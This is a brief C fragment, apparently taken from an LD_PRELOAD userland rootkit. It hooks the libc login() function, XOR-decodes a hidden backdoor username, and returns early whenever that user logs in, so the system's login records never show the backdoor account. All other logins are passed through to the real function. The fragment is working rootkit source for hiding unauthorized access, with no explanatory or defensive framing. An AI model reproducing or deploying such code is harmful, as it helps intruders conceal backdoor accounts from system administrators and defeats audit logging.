void login(const struct utmp *ut)
{
    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(!strcmp((char *)ut->ut_user,bduname)) { CLEAN(bduname); return; }
    CLEAN(bduname);

    HOOK(o_login,CLOGIN);
    o_login(ut);
}
